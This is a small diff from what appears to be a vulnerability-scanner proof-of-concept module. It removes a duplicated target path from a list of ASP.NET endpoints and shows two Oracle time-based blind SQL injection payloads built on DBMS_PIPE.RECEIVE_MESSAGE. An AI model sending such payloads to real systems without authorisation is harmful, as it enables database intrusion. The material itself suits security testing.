@@ -69,7 +69,6 @@ class Poc(ABPoc):
                         '/custom/CompanyCGList.aspx?ComId=1',
                         '/SuperMarket/InterestInfoDetail.aspx?ItemId=1',
                         '/Orders/k3orderdetail.aspx?FINTERID=1',
-                        '/custom/CompanyCGList.aspx?ComId=1',
                         '/custom/GroupNewsList.aspx?child=true&groupId=121']
             payload0 = "%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,0)"
             payload1 = "%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,5)"
